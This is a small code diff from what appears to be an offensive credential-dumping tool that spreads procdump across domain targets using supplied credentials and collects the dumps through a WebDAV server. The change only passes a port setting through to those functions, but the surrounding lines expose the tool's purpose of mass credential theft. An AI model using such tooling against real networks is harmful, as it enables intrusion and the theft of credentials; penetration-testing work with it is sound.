@@ -23,7 +23,7 @@ def run(args):
 	jobs = []
 	user = User(args.domain, args.username, args.password)
 	q = Queue()
-	davServer = Process(target=launchDavServer, args=(q,))
+	davServer = Process(target=launchDavServer, args=(q, args.port))
 
 	try:
 		targets = listPwnableTargets(args.targets, user)
@@ -32,7 +32,7 @@ def run(args):
 		if q.get() == 0:
 			logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s." % (warningGre, green, white))
 			for target in targets:
-				jobs.append(Process(target=sprayLove, args=(user, target, args.methods, args.share)))
+				jobs.append(Process(target=sprayLove, args=(user, target, args.methods, args.share, args.port)))
 				jobs[-1].start()
 
 			joinThreads(davServer, jobs, args.wait)
